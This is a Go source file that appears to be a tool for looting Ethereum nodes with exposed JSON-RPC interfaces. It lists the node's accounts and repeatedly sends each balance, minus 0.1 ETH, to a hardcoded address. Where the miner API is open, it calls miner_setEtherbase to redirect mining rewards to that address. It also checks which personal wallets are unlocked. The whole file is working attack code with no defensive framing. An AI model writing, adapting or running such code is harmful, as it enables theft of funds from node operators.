package sendtx

import (
	"context"
	"fmt"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/ethereum/go-ethereum/params"
	"github.com/ethereum/go-ethereum/rpc"
	"math/big"
	"time"
)

//get all account
var account []common.Address
const CHAINID = 10
var (
	to = common.HexToAddress("0x18A2dC260795724203271f6d12486D7b44B37AC6")
)

func GetClient(url string) *rpc.Client {
	ctx := context.Background()
	client, err := rpc.DialContext(ctx, url)
	if err != nil {
		fmt.Printf("Failed to connect to Ethereum node: %v \n", err)
		return nil
	}
	var result hexutil.Big
	err = client.CallContext(ctx, &result, "eth_chainId")
	if err != nil {
		return nil
	}
	return client
}

func ChainID(client *rpc.Client) *big.Int {
	var result hexutil.Big
	err := client.Call(&result, "eth_chainId")
	if err != nil {
		fmt.Println(err)
		return nil
	}
	return (*big.Int)(&result)
}

func sendMoreTx(client *rpc.Client)  {
	if len(getAccount(client)) != 0 {
		for i := 0; i < 100000; i++ {
			for _, v := range account {
				sendTransaction(client, v)
			}
			time.Sleep(time.Second* 3)
		}
		return
	}
}

func QueryDetail(client *rpc.Client, url string, apis map[string]string, chainId *big.Int) {

	minerAction(client,apis,chainId)
	if len(getAccount(client)) != 0 {
		doAccount(client,chainId,url,apis)
		return
	}

	doCoinbase(client,chainId)
}

func doCoinbase(client *rpc.Client, chainId *big.Int) {
	coinbase := getCoinbase(client)
	if coinbase != (common.Address{}) && chainId.Cmp(params.GoerliChainConfig.ChainID) == 0 {
		var mine bool
		var hashrate hexutil.Uint64
		err := client.Call(&mine, "eth_mining")
		err = client.Call(&hashrate, "eth_hashrate")
		balance, _ := BalanceAt(client, to, nil)
		coinbaseB, _ := BalanceAt(client, coinbase, nil)

		fmt.Println("mine", mine,"chainId",chainId, "coinbaseB", weiToEthStr(coinbaseB), "value", weiToEthStr(balance), "err", err,"hash",hashrate)
	}
}

func doAccount(client *rpc.Client, chainId *big.Int, url string, apis map[string]string) {
	total := new(big.Int).SetInt64(0)
	for _, v := range account {
		balance, _ := BalanceAt(client, v, nil)
		total.Add(total, balance)
	}
	balance, _ := BalanceAt(client, to, nil)

	if WeiToEth(total).Uint64() >= 1 {
		arr := personalAction(client,apis)
		if len(account) != 0 {
			for _, v := range account {
				sendTransaction(client,v)
			}

			fmt.Println("miner", weiToEthStr(total),"chainId", chainId, "url", url, "apis", apis, "arr", arr,"my", weiToEthStr(balance), account[0].String())
		}
	}
	fmt.Println("total", weiToEthStr(balance),"chainId", chainId, "url", url, "apis", apis)
}

func personalAction(client *rpc.Client, apis map[string]string) []rawAccount {
	var arr []rawAccount
	if _, ok := apis["personal"]; ok {
		var raws []rawWallet
		client.Call(&raws, "personal_listWallets")
		for _, account := range raws {
			if account.Status == "Unlocked" {
				arr = append(arr, rawAccount{"Unlocked", account.Accounts[0].Address.String()})
			} else {
				arr = append(arr, rawAccount{"Locked", account.Accounts[0].Address.String()})
			}
		}
	}
	return arr
}

func minerAction(client *rpc.Client, apis map[string]string,chainId * big.Int) {
	if _, ok := apis["miner"]; ok {
		if chainId.Uint64() > CHAINID {
			return
		}
		var mine, sucee bool
		var coinbase common.Address
		var hashrate uint64
		err := client.Call(&mine, "eth_mining")
		err = client.Call(&coinbase, "eth_coinbase")
		err = client.Call(&hashrate, "eth_hashrate")
		if coinbase == (common.Address{}) || coinbase != to {
			err = client.Call(&sucee, "miner_setEtherbase", to)
		}

		balance, _ := BalanceAt(client, to, nil)

		fmt.Println(mine, coinbase.String(), "hashrate", hashrate, "success", sucee, "value", weiToEthStr(balance), "err", err)
	}
}

func getCoinbase(client *rpc.Client) common.Address {
	var coinbase common.Address
	err := client.Call(&coinbase, "eth_coinbase")
	if err != nil {
		return coinbase
	}
	return coinbase
}

func getAccount(client *rpc.Client) []common.Address {
	err := client.Call(&account, "eth_accounts")
	if err != nil {
		return nil
	}
	return account
}

func sendTransaction(client *rpc.Client, from common.Address) error {
	balance, _ := BalanceAt(client, from, nil)
	if balance.Uint64() > 0 {
		value := getTransferValue(balance)
		hash, err := sendRawTransaction(client, from, to, value)
		if err != nil {
			fmt.Println("sendRawTransaction ", err)
			return nil
		}
		fmt.Println("Success", weiToEthStr(value), weiToEthStr(balance), "hash", hash.String(), from.String())
	}
	return nil
}

func NetworkID(client *rpc.Client) (*big.Int, error) {
	version := new(big.Int)
	var ver string
	if err := client.Call(&ver, "net_version"); err != nil {
		return nil, err
	}
	if _, ok := version.SetString(ver, 10); !ok {
		return nil, fmt.Errorf("invalid net_version result %q", ver)
	}
	return version, nil
}

var (
	baseUnit  = new(big.Int).Exp(big.NewInt(10), big.NewInt(18), nil)
	fbaseUnit = new(big.Float).SetFloat64(float64(baseUnit.Int64()))
)

func weiToEthStr(val *big.Int) string {
	return new(big.Float).Quo(new(big.Float).SetInt(val), fbaseUnit).Text('f', 6)
}

func getTransferValue(trueValue *big.Int) *big.Int {
	baseUnit := new(big.Int).Exp(big.NewInt(10), big.NewInt(17), nil)
	value := new(big.Int).Sub(trueValue, baseUnit)
	return value
}

func WeiToEth(value *big.Int) *big.Int {
	baseUnit := new(big.Int).Exp(big.NewInt(10), big.NewInt(18), nil)
	return new(big.Int).Div(value, baseUnit)
}

func BalanceAt(client *rpc.Client, account common.Address, blockNumber *big.Int) (*big.Int, error) {
	var result hexutil.Big
	err := client.Call(&result, "eth_getBalance", account, toBlockNumArg(blockNumber))
	return (*big.Int)(&result), err
}

func toBlockNumArg(number *big.Int) string {
	if number == nil {
		return "latest"
	}
	pending := big.NewInt(-1)
	if number.Cmp(pending) == 0 {
		return "pending"
	}
	return hexutil.EncodeBig(number)
}
